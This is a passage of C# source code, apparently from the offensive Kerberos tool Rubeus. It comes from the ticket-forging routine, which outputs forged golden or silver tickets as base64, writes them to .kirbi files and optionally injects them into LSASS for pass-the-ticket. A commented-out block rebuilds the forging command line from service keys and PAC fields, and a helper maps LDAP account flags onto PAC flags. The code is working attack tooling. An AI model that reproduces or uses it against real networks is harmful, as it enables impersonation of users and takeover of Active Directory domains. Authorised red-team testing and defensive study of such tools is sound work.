                Console.WriteLine("[*] base64(ticket.kirbi):\r\n");

                if (Program.wrapTickets)
                {
                    // display the .kirbi base64, columns of 80 chararacters
                    foreach (string line in Helpers.Split(kirbiString, 80))
                    {
                        Console.WriteLine("      {0}", line);
                    }
                }
                else
                {
                    Console.WriteLine("      {0}", kirbiString);
                }

                Console.WriteLine("");

                if (!String.IsNullOrEmpty(options.outfile))
                {
                    DateTime fileTime = (DateTime)startTime;
                    string filename = $"{Helpers.GetBaseFromFilename(options.outfile)}_{fileTime.ToString("yyyy_MM_dd_HH_mm_ss")}_{info.pname.name_string[0]}_to_{info.sname.name_string[0]}@{info.srealm}{Helpers.GetExtensionFromFilename(options.outfile)}";
                    filename = Helpers.MakeValidFileName(filename);
                    if (Helpers.WriteBytesToFile(filename, kirbiBytes))
                    {
                        Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", filename);
                    }
                }

                Console.WriteLine("");

                if (options.ptt)
                {
                    // pass-the-ticket -> import into LSASS
                    LSA.ImportTicket(kirbiBytes, new LUID());
                }

                // increase startTime by rangeInterval
                startTime = Helpers.FutureDate((DateTime)startTime, options.rangeInterval);
                if (startTime == null)
                {
                    Console.WriteLine("[!] Invalid /rangeinterval passed, skipping multiple ticket generation: {0}", options.rangeInterval);
                    startTime = options.rangeEnd;
                }
                authTime = startTime;

            } while (startTime < options.rangeEnd);


            // TODO: Uncomment this and fix all the references

            //if (printcmd)
            //{
            //    // print command to be able to recreate a ticket with this information
            //    string cmdOut = String.Format("{0}", System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);

            //    // deal with differences between golden and silver
            //    if (parts[0].Equals("krbtgt") && parts[1].Equals(domain))
            //    {
            //        cmdOut = String.Format("{0} golden", cmdOut, Helpers.ByteArrayToString(serviceKey));
            //    }
            //    else
            //    {
            //        string krbEncType = "";
            //        if (kdcSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5))
            //        {
            //            krbEncType = "rc4";
            //        }
            //        else if (kdcSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128))
            //        {
            //            krbEncType = "aes128";
            //        }
            //        else if (kdcSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256))
            //        {
            //            krbEncType = "aes256";
            //        }
            //        cmdOut = String.Format("{0} silver /service:{1} /krbkey:{2} /kebenctype:{3}", cmdOut, sname, Helpers.ByteArrayToString(krbKey), krbEncType);
            //    }

            //    // add the service key
            //    string svrEncType = "";
            //    if (svrSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5))
            //    {
            //        svrEncType = "rc4";
            //    }
            //    else if (svrSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128))
            //    {
            //        svrEncType = "aes128";
            //    }
            //    else if (svrSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256))
            //    {
            //        svrEncType = "aes256";
            //    }
            //    cmdOut = String.Format("{0} /{1}:{2}", cmdOut, svrEncType, Helpers.ByteArrayToString(serviceKey));

            //    // add the rest of the values
            //    cmdOut = String.Format("{0} /user:{1} /id:{2} /pgid:{3} /domain:{4} /sid:{5}", cmdOut, user, kvi.UserId, kvi.PrimaryGroupId, domain, kvi.LogonDomainId.GetValue());
            //    try
            //    {
            //        cmdOut = String.Format("{0} /logofftime:\"{1}\"", cmdOut, DateTime.FromFileTimeUtc((long)kvi.LogoffTime.LowDateTime | ((long)kvi.LogoffTime.HighDateTime << 32)).ToLocalTime());
            //    }
            //    catch { }
            //    try
            //    {
            //        cmdOut = String.Format("{0} /pwdlastset:\"{1}\"", cmdOut, DateTime.FromFileTimeUtc((long)kvi.PasswordLastSet.LowDateTime | ((long)kvi.PasswordLastSet.HighDateTime << 32)).ToLocalTime());
            //    }
            //    catch { }
            //    if (minPassAge != null && minPassAge > 0)
            //    {
            //        cmdOut = String.Format("{0} /minpassage:{1}", cmdOut, minPassAge);
            //    }
            //    if (maxPassAge != null && maxPassAge > 0)
            //    {
            //        cmdOut = String.Format("{0} /maxpassage:{1}", cmdOut, maxPassAge);
            //    }
            //    if (kvi.BadPasswordCount > 0)
            //    {
            //        cmdOut = String.Format("{0} /badpwdcount:{1}", cmdOut, kvi.BadPasswordCount);
            //    }
            //    if (kvi.LogonCount > 0)
            //    {
            //        cmdOut = String.Format("{0} /logoncount:{1}", cmdOut, kvi.LogonCount);
            //    }
            //    if (!String.IsNullOrEmpty(kvi.FullName.ToString()))
            //    {
            //        cmdOut = String.Format("{0} /displayname:\"{1}\"", cmdOut, kvi.FullName.ToString());
            //    }
            //    if (!String.IsNullOrEmpty(kvi.LogonScript.ToString()))
            //    {
            //        cmdOut = String.Format("{0} /scriptpath:\"{1}\"", cmdOut, kvi.LogonScript.ToString());
            //    }
            //    if (!String.IsNullOrEmpty(kvi.ProfilePath.ToString()))
            //    {
            //        cmdOut = String.Format("{0} /profilepath:\"{1}\"", cmdOut, kvi.ProfilePath.ToString());
            //    }
            //    if (!String.IsNullOrEmpty(kvi.HomeDirectory.ToString()))
            //    {
            //        cmdOut = String.Format("{0} /homedir:\"{1}\"", cmdOut, kvi.HomeDirectory.ToString());
            //    }
            //    if (!String.IsNullOrEmpty(kvi.HomeDirectoryDrive.ToString()))
            //    {
            //        cmdOut = String.Format("{0} /homedrive:\"{1}\"", cmdOut, kvi.HomeDirectoryDrive.ToString());
            //    }
            //    if (!String.IsNullOrEmpty(kvi.LogonDomainName.ToString()))
            //    {
            //        cmdOut = String.Format("{0} /netbios:{1}", cmdOut, kvi.LogonDomainName.ToString());
            //    }
            //    if (kvi.GroupCount > 0)
            //    {
            //        cmdOut = String.Format("{0} /groups:{1}", cmdOut, kvi.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
            //    }
            //    if (kvi.SidCount > 0)
            //    {
            //        cmdOut = String.Format("{0} /sids:{1}", cmdOut, kvi.ExtraSids.GetValue().Select(s => s.Sid.ToString()).Aggregate((cur, next) => cur + "," + next));
            //    }
            //    if (kvi.ResourceGroupCount > 0)
            //    {
            //        cmdOut = String.Format("{0} /resourcegroupsid:{1} /resourcegroups:{2}", cmdOut, kvi.ResourceGroupDomainSid.GetValue().ToString(), kvi.ResourceGroupIds.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
            //    }
            //    if (!String.IsNullOrEmpty(kvi.LogonServer.ToString()))
            //    {
            //        cmdOut = String.Format("{0} /dc:{1}.{2}", cmdOut, kvi.LogonServer.ToString(), domain);
            //    }
            //    if ((Interop.PacUserAccountControl)kvi.UserAccountControl != Interop.PacUserAccountControl.NORMAL_ACCOUNT)
            //    {
            //        cmdOut = String.Format("{0} /uac:{1}", cmdOut, String.Format("{0}", (Interop.PacUserAccountControl)kvi.UserAccountControl).Replace(" ", ""));
            //    }
            //    if (!user.Equals(cName))
            //    {
            //        cmdOut = String.Format("{0} /cname:{1}", cmdOut, cName);
            //    }
            //    if (!String.IsNullOrEmpty(s4uProxyTarget) && !String.IsNullOrEmpty(s4uTransitedServices))
            //    {
            //        cmdOut = String.Format("{0} /s4uproxytarget:{1} /s4utransitiedservices:{2}", cmdOut, s4uProxyTarget, s4uTransitedServices);
            //    }
            //    if (includeAuthData)
            //    {
            //        cmdOut = String.Format("{0} /authdata", cmdOut);
            //    }

            //    // print the command
            //    Console.WriteLine("\r\n[*] Printing a command to recreate a ticket containing the information used within this ticket\r\n\r\n{0}\r\n", cmdOut);
            //}
        }

        private static int LdapUacToPacUac(Interop.LDAPUserAccountControl ldapUac)
        {
            int uacValue = 0;
            if ((ldapUac & Interop.LDAPUserAccountControl.ACCOUNTDISABLE) != 0)
            {
                uacValue |= (int)Interop.PacUserAccountControl.ACCOUNTDISABLE;
            }
            if ((ldapUac & Interop.LDAPUserAccountControl.HOMEDIR_REQUIRED) != 0)
            {
                uacValue |= (int)Interop.PacUserAccountControl.HOMEDIR_REQUIRED;
            }

            if ((ldapUac & Interop.LDAPUserAccountControl.PASSWD_NOTREQD) != 0)
            {
                uacValue |= (int)Interop.PacUserAccountControl.PASSWD_NOTREQD;
            }
            if ((ldapUac & Interop.LDAPUserAccountControl.TEMP_DUPLICATE_ACCOUNT) != 0)
            {
                uacValue |= (int)Interop.PacUserAccountControl.TEMP_DUPLICATE_ACCOUNT;
            }
            if ((ldapUac & Interop.LDAPUserAccountControl.NORMAL_ACCOUNT) != 0)
            {
                uacValue |= (int)Interop.PacUserAccountControl.NORMAL_ACCOUNT;
            }
            if ((ldapUac & Interop.LDAPUserAccountControl.MNS_LOGON_ACCOUNT) != 0)
            {
                uacValue |= (int)Interop.PacUserAccountControl.MNS_LOGON_ACCOUNT;
            }
            if ((ldapUac & Interop.LDAPUserAccountControl.INTERDOMAIN_TRUST_ACCOUNT) != 0)
            {
                uacValue |= (int)Interop.PacUserAccountControl.INTERDOMAIN_TRUST_ACCOUNT;
            }
            if ((ldapUac & Interop.LDAPUserAccountControl.WORKSTATION_TRUST_ACCOUNT) != 0)
            {
                uacValue |= (int)Interop.PacUserAccountControl.WORKSTATION_TRUST_ACCOUNT;
            }
            if ((ldapUac & Interop.LDAPUserAccountControl.SERVER_TRUST_ACCOUNT) != 0)
            {
                uacValue |= (int)Interop.PacUserAccountControl.SERVER_TRUST_ACCOUNT;
            }
            if ((ldapUac & Interop.LDAPUserAccountControl.DONT_EXPIRE_PASSWORD) != 0)
            {
                uacValue |= (int)Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD;
            }
            // Is this right? LDAP UAC field doesn't contain ACCOUNT_AUTO_LOCKED, LOCKOUT looks like the most likely candidate
            if ((ldapUac & Interop.LDAPUserAccountControl.LOCKOUT) != 0)
            {
                uacValue |= (int)Interop.PacUserAccountControl.ACCOUNT_AUTO_LOCKED;
            }
            if ((ldapUac & Interop.LDAPUserAccountControl.ENCRYPTED_TEXT_PWD_ALLOWED) != 0)
            {
                uacValue |= (int)Interop.PacUserAccountControl.ENCRYPTED_TEXT_PASSWORD_ALLOWED;
            }
            if ((ldapUac & Interop.LDAPUserAccountControl.SMARTCARD_REQUIRED) != 0)
            {
                uacValue |= (int)Interop.PacUserAccountControl.SMARTCARD_REQUIRED;
            }
            if ((ldapUac & Interop.LDAPUserAccountControl.TRUSTED_FOR_DELEGATION) != 0)
            {
                uacValue |= (int)Interop.PacUserAccountControl.TRUSTED_FOR_DELEGATION;
            }
            if ((ldapUac & Interop.LDAPUserAccountControl.NOT_DELEGATED) != 0)
            {
                uacValue |= (int)Interop.PacUserAccountControl.NOT_DELEGATED;
            }
            if ((ldapUac & Interop.LDAPUserAccountControl.USE_DES_KEY_ONLY) != 0)
            {
                uacValue |= (int)Interop.PacUserAccountControl.USE_DES_KEY_ONLY;
            }
            if ((ldapUac & Interop.LDAPUserAccountControl.DONT_REQ_PREAUTH) != 0)
            {
                uacValue |= (int)Interop.PacUserAccountControl.DONT_REQ_PREAUTH;
            }
            if ((ldapUac & Interop.LDAPUserAccountControl.PASSWORD_EXPIRED) != 0)
            {
                uacValue |= (int)Interop.PacUserAccountControl.PASSWORD_EXPIRED;
            }
            if ((ldapUac & Interop.LDAPUserAccountControl.TRUSTED_TO_AUTH_FOR_DELEGATION) != 0)
            {
                uacValue |= (int)Interop.PacUserAccountControl.TRUSTED_TO_AUTH_FOR_DELEGATION;
            }
            /* No NO_AUTH_DATA_REQUIRED bit seems to exist in the UAC field returned by LDAP
            if ((userUAC & Interop.LDAPUserAccountControl.NO_AUTH_DATA_REQUIRED) != 0)
            {
                uacValue |= (int)Interop.PacUserAccountControl.NO_AUTH_DATA_REQUIRED;
            }*/
            if ((ldapUac & Interop.LDAPUserAccountControl.PARTIAL_SECRETS_ACCOUNT) != 0)
            {
                uacValue |= (int)Interop.PacUserAccountControl.PARTIAL_SECRETS_ACCOUNT;
            }
            /* No USE_AES_KEYS bit seems to exist in the UAC field returned by LDAP
            if ((userUAC & Interop.LDAPUserAccountControl.USE_AES_KEYS) != 0)
            {
                uacValue = uacValue | (int)Interop.PacUserAccountControl.USE_AES_KEYS;
            }*/
            return uacValue;
        }
    }
}
